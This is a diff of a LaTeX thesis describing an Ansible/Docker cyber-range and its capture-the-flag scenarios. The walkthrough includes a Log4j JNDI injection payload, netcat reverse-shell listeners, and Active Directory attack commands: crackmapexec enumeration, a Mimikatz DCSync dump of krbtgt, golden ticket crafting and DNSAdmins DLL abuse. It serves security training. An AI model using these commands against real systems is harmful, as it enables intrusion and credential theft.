@@ -103,7 +103,7 @@ As shown in Listing \ref{lst:ansible_vars_1} (p. \pageref{lst:ansible_vars_1}), 
 
 The second category of Ansible variables for machines belonging to the \textit{all} group can be seen in Appendix \ref{ap1:ansible_vars_docker_networks} (p. \pageref{ap1:ansible_vars_docker_networks}). This section concerns Docker networks, according to the structure mentioned in Section \ref{sec:validation_architecture} (p. \pageref{sec:validation_architecture}). The range of each network is defined, as well as the gateway address which points to the host machine. This is mandatory by Docker, as the host machine should always take part in each created virtual Docker network to forward packets from and to it. At last, the \textit{random\_byte} points to a random byte that changes across each scenario execution and confers some degree of randomization, as for each new scenario execution, the networks' IP addresses will change. 
 
-Appendix \ref{ap1:ansible_vars_machine} (p. \pageref{ap1:ansible_vars_machine}) presents a typical example of the attacker machine's declaration. Several attributes are specified according to the logic of a Docker container. We start by its name, the Docker image it uses, possible volumes (anonymous, named, or bind mounts), the groups the container belongs to, and published ports, meaning ports mapped between the Docker container and the host machine. Then, we specify the networks the container belongs to, which can be several, as it happens, for instance, in routers. Lastly, we define where to find the DNS server. In this case, as the attacker machine is located in the external network, we redirect DNS queries to the edge router's network interface sitting in the external network so that these queries are later forwarded to the DNS server in the DMZ. This is achieved using \texttt{iptables} rules. For machines located inside the corporate network, DNS queries are sent directly to the DNS server sitting in the DMZ network without the need for any type of forwarding by the edge router. It is also important to mention other attributes that are also possible to be specified, namely the \textit{devices} and \textit{privilege} attributes, all having the same meaning as understood by Docker. Although Appendix \ref{ap1:ansible_vars_machine} (p. \pageref{ap1:ansible_vars_machine}) provided only an example of the attacker machine, other network services follow a similar logic.
+Appendix \ref{ap1:ansible_vars_machine} (p. \pageref{ap1:ansible_vars_machine}) presents a typical example of the attacker machine's declaration. Several attributes are specified according to the logic of a Docker container. We start by its name, the Docker image it uses, possible volumes (anonymous, named, or bind mounts), the groups the container belongs to, and published ports, meaning ports mapped between the Docker container and the host machine. Then, we specify the networks the container belongs to, which can be several, as it happens, for instance, in routers. Lastly, we define where to find the DNS server. In this case, as the attacker machine is located in the external network, we redirect DNS queries to the edge router's network interface sitting in the external network so that these queries are later forwarded to the DNS server in the DMZ. This is achieved using \textit{iptables} rules. For machines located inside the corporate network, DNS queries are sent directly to the DNS server sitting in the DMZ network without the need for any type of forwarding by the edge router. It is also important to mention other attributes that are also possible to be specified, namely the \textit{devices} and \textit{privilege} attributes, all having the same meaning as understood by Docker. Although Appendix \ref{ap1:ansible_vars_machine} (p. \pageref{ap1:ansible_vars_machine}) provided only an example of the attacker machine, other network services follow a similar logic.
 
 \subsection{Custom Scenario Variables} \label{sec:custom_scenario_variables}
 
@@ -143,7 +143,7 @@ Then, Listing \ref{lst:ansible_vars_7} (p. \pageref{lst:ansible_vars_7}) referen
     \item \textit{to\_port}: the destination port in the target machine where the edge router will redirect packets.
 \end{itemize}
 
-Some names may be misleading, such as \textit{destination\_port} and \textit{to\_port}. Still, they obey the convention used by \texttt{iptables}.
+Some names may be misleading, such as \textit{destination\_port} and \textit{to\_port}. Still, they obey the convention used by \textit{iptables}.
 
 \begin{lstlisting}[language=yaml,caption=Ansible Variables - Setup Section.,numbers=none,label={lst:ansible_vars_8}]
 setup:
@@ -212,7 +212,7 @@ The next role leads us to the router's configuration steps. Here we distinguish 
 
 The internal router takes a single action to configure its default gateway with the edge router's DMZ network interface, as this is the gateway that provides internet access to the network.
 
-The edge router's task is to provide NAT to packets whose source matches the internal or DMZ networks. This is accomplished using the \texttt{MASQUERADE} jump of \texttt{iptables}. Lastly, a static route is added, specifying that packets destined to the internal network should be directed to the DMZ interface of the internal router.
+The edge router's task is to provide NAT to packets whose source matches the internal or DMZ networks. This is accomplished using the \texttt{MASQUERADE} jump of \textit{iptables}. Lastly, a static route is added, specifying that packets destined to the internal network should be directed to the DMZ interface of the internal router.
 
 \subsubsection{Custom Machines Role} \label{sec:ansible_custom_machines_role}
 
@@ -238,7 +238,7 @@ One crucial aspect of this configuration is the signing of public-key certificat
 
 The \textit{firewall} role focuses on the two existing routers which incorporate a firewall. During this explanation, we will refer to the internal router's firewall as the internal firewall and to the edge router's firewall, we will refer to it as the external firewall. 
 
-Starting with the internal firewall, the role performs the following \texttt{iptables} actions:
+Starting with the internal firewall, the role performs the following \textit{iptables} actions:
 
 \begin{itemize}
     \item Set the forward chain's default policy to drop, meaning the internal router does not forward traffic by default.
@@ -246,7 +246,7 @@ Starting with the internal firewall, the role performs the following \texttt{ipt
     \item New, previously established, or related connections from the internal network are also accepted.
 \end{itemize}
 
-Concerning the external firewall, this role performs the following \texttt{iptables} actions:
+Concerning the external firewall, this role performs the following \textit{iptables} actions:
 
 \begin{itemize}
     \item \textbf{Generic Rules:}
@@ -345,7 +345,7 @@ Furthermore, Docker entry point scripts were changed to always reload SSL certif
 
 After the above-mentioned SSL certificates are issued, the newly created root CA's public-key certificate is needed in the attacker machine to be considered trustworthy. This way, when the trainee visits the UniFi dashboard, the website appears with a legitimate HTTPS connection. Appendix \ref{ap1:log4j_entrypoint_script} (p. \pageref{ap1:log4j_entrypoint_script}) shows details on the entry point script.
 
-Every template file is within the scenario's setup folder. Firstly, we run a \textit{Python} script that will be promptly explained. Then, we copy the root CA's public-key certificate into a special \texttt{ca-certificates} folder and run the \texttt{update-ca-certificates} command, which turns our newly placed root CA certificate into system-wide trusted. So, every digital certificate signed by this new root CA will be deemed safe. After this, we need the Firefox browser to consider this CA safe. So we copied the \texttt{policies.json} file into a special folder.
+Every template file is within the scenario's setup folder. Firstly, we run a Python script that will be promptly explained. Then, we copy the root CA's public-key certificate into a special \texttt{ca-certificates} folder and run the \texttt{update-ca-certificates} command, which turns our newly placed root CA certificate into system-wide trusted. So, every digital certificate signed by this new root CA will be deemed safe. After this, we need the Firefox browser to consider this CA safe. So we copied the \texttt{policies.json} file into a special folder.
 
 \begin{lstlisting}[caption=Firefox's Policies File.,numbers=none,label={lst:firefox_json_policies}]
 {
@@ -379,7 +379,7 @@ With these configurations set, we are ready to move into the exploitation phase.
 
 The goal of the Log4j exploit on UniFi's software is to obtain a reverse shell, get the secret flag, and leverage access to get the administrative credentials on the UniFi MongoDB instance.
 
-Initially, we can dig a little into the reconnaissance process and check which ports are open by default in the victim machine using \texttt{nmap}. We can see port 8443, which is where UniFi's interface is.
+Initially, we can dig a little into the reconnaissance process and check which ports are open by default in the victim machine using \textit{nmap}. We can see port 8443, which is where UniFi's interface is.
 
 Then, we access the \texttt{https://example-domain.ui.com:8443} domain and get the login page from Fig. \ref{fig:log4j_unifi_initial_dashboard} (p. \pageref{fig:log4j_unifi_initial_dashboard}).
 
@@ -391,11 +391,11 @@ Then, we access the \texttt{https://example-domain.ui.com:8443} domain and get t
 
 As mentioned earlier, we need to target a field we know will be logged by Apache Log4j using a malicious JNDI query. In our case, it is the \texttt{remember} field of the POST request.
 
-Then, we can test if the web application is vulnerable to the Log4j attack. First, we listen for connections on port 9999 using \texttt{netcat} with: \texttt{nc -lnvp 9999}. From the POST request issued when submitting the login form, we only need to change the \texttt{remember} field to \texttt{\$\{jndi:ldap://172.152.0.2:9999/whatever\}} and issue the modified POST request. Notice \texttt{172.152.0.2} is the attacker machine's IP address.
+Then, we can test if the web application is vulnerable to the Log4j attack. First, we listen for connections on port 9999 using \textit{netcat} with: \texttt{nc -lnvp 9999}. From the POST request issued when submitting the login form, we only need to change the \texttt{remember} field to \texttt{\$\{jndi:ldap://172.152.0.2:9999/whatever\}} and issue the modified POST request. Notice \texttt{172.152.0.2} is the attacker machine's IP address.
 
 As we get a connection to port 9999 from the vulnerable Log4j container, the web application is indeed susceptible to the exploit. The next step is to use the Rogue-JNDI GitHub tool\footnote{\url{https://github.com/veracode-research/rogue-jndi}} to obtain a reverse shell on the target. Essentially, this tool sets up a malicious LDAP and HTTP server for JNDI injection attacks. When the tool first receives a connection from the vulnerable client to connect to the local LDAP server, it responds with a malicious entry containing a payload that will be useful to achieve a Remote Code Execution. The steps to build upon this foundation are to stage an LDAP Referral Server that will redirect the initial client request of the victim to an HTTP server where a secondary payload is hosted that will eventually run code on the target. 
 
-The procedures to set up the exploit include first using \texttt{netcat} to listen for inbound connections on port 4444 with the command \texttt{nc -lnvp 4444} and then following the steps of Appendix \ref{ap1:unifi_clone_rogue_jndi} (p. \pageref{ap1:unifi_clone_rogue_jndi}):
+The procedures to set up the exploit include first using \textit{netcat} to listen for inbound connections on port 4444 with the command \texttt{nc -lnvp 4444} and then following the steps of Appendix \ref{ap1:unifi_clone_rogue_jndi} (p. \pageref{ap1:unifi_clone_rogue_jndi}):
 
 \begin{enumerate}
     \item Clone the Rogue JNDI tool and build the project into a JAR file using Maven.
@@ -404,7 +404,7 @@ The procedures to set up the exploit include first using \texttt{netcat} to list
     \item Issue a cURL command with the malicious JNDI query and run the exploit.
 \end{enumerate}
 
-As a result, we obtain a reverse shell in our initial \texttt{netcat} listener. We now have access to the target server under the \textit{unifi} user. Running a simple \texttt{ls -la} command, we can see there is a weird file with the name ``\texttt{...}'' (3 dots). If we open it, we will find the challenge flag \texttt{flag\{l3ts\_un1f1\_every0ne\_l0g4j\}}.
+As a result, we obtain a reverse shell in our initial \textit{netcat} listener. We now have access to the target server under the \textit{unifi} user. Running a simple \texttt{ls -la} command, we can see there is a weird file with the name ``\texttt{...}'' (3 dots). If we open it, we will find the challenge flag \texttt{flag\{l3ts\_un1f1\_every0ne\_l0g4j\}}.
 
 \subsubsection{Post Exploitation} \label{sec:validation_log4j_post_exploitation}
 
@@ -706,7 +706,7 @@ This section intends to explore attacks on our Active Directory scenario. During
     \item \textbf{Mimikatz}, a tool that can exploit Microsoft's Authentication systems. It can perform attacks such as: \textit{Pass the Hash}, \textit{Pass the Ticket}, \textit{Kerberoast Golden and Silver Tickets}, \textit{DCSync} attacks, among others. 
 \end{itemize}
 
-As in the Log4j scenario, we can start by doing some reconnaissance using, for instance, \texttt{nmap}. We can view the hypervisor container with port 22 open, which is the machine responsible for redirecting traffic to the target Windows Server machine.
+As in the Log4j scenario, we can start by doing some reconnaissance using, for instance, \textit{nmap}. We can view the hypervisor container with port 22 open, which is the machine responsible for redirecting traffic to the target Windows Server machine.
 
 The next step is to grab a set of commonly used Active Directory users and a subset of the \textit{rockyou.txt} password dictionary to test if we can find some AD user accounts. At first, we need to register our hypervisor container as the attacker machine's DNS server. Then, we attempt to get some users using \textit{CME} with: \texttt{crackmapexec ldap 172.100.0.40 -u users.txt -p '' -k}, where \textit{172.100.0.40} is our bastion host, and the users file contains some of the commonly used AD usernames. The retrieved output tells us existing AD users, as well as information on the Domain Controller, for instance, the hostname (\textit{DC01}) and the domain we are currently targeting (\textit{xyz.com}). With this information in mind, we can also map an entry in the \texttt{/etc/hosts} file of the \texttt{dc01.xyz.com} domain to the \texttt{172.100.0.40} IP address.
 
@@ -746,7 +746,7 @@ The next attack is \textit{Pass the Ticket}, where we start by the fact that we 
 The unintended solution uses \textit{PsExec}\footnote{\url{https://learn.microsoft.com/en-us/sysinternals/downloads/psexec}} to perform Local Privilege Escalation, which allows a non-admin process to escalate to SYSTEM if we run \textit{PsExec} with \texttt{.\textbackslash PsExec64.exe -accept\\eula \textbackslash\textbackslash dc01 -s cmd} using the local administrator account on a Remote Desktop session. We then change the directory into the \textit{internal} network share folder and print out the flag.
 
 % Golden Ticket & DCSync
-To perform the \textit{Golden Ticket} attack, we first grab the NT hashes using \textit{Impacket's Secrets Dump} module, as before, and the domain SID with \texttt{crackmapexec ldap dc01.xyz.com -u USERNAME -p PASSWORD ---get-sid}. We can get a remote session using the local administrator account in the Domain Controller and using \textit{Mimikatz} in the remote machine, dump the \textit{KRBTGT} account hashes by performing a \textit{DCSync} attack with \textit{lsadump::dcsync /domain:xyz.com /user:krbtgt}. Then, we craft the Golden Ticket using the obtained Domain SID and the \textit{KRBTGT} NT hash. To craft a Golden Ticket for the Administrator AD account, we run \texttt{kerberos::golden /domain:xyz.com /sid:AD\_DOMAIN\_SID /user:AD\_IMPERSONATED\_USER /krbtgt\\:KRBTGT\_NTHASH /id:AD\_IMPERSONATED\_USER\_ID /ptt}. With not just a Domain Controller but also workstations, we should be able to run the attack and get administrator privileges in the Domain Controller.
+To perform the \textit{Golden Ticket} attack, we first grab the NT hashes using \textit{Impacket's Secrets Dump} module, as before, and the domain SID with \texttt{crackmapexec ldap dc01.xyz.com -u USERNAME -p PASSWORD ---get-sid}. We can get a remote session using the local administrator account in the Domain Controller and using \textit{Mimikatz} in the remote machine, dump the \textit{KRBTGT} account hashes by performing a \textit{DCSync} attack with \texttt{lsadump::dcsync /domain:x\\yz.com /user:krbtgt}. Then, we craft the Golden Ticket using the obtained Domain SID and the \textit{KRBTGT} NT hash. To craft a Golden Ticket for the Administrator AD account, we run \texttt{kerberos::golden /domain:xyz.com /sid:AD\_DOMAIN\_SID /user:AD\_IMPERSON\\ATED\_USER /krbtgt:KRBTGT\_NTHASH /id:AD\_IMPERSONATED\_USER\_ID /ptt}. With not just a Domain Controller but also workstations, we should be able to run the attack and get administrator privileges in the Domain Controller.
 
 % Abuse DNS Admins
 Lastly, we can perform a DLL injection attack using a vulnerable AD account belonging to the \textit{DNSAdmins} group. Essentially, this DLL is a reverse shell that connects to the attacker machine, and the threat actor should be able to obtain \textit{SYSTEM} privileges on the Domain Controller machine. 
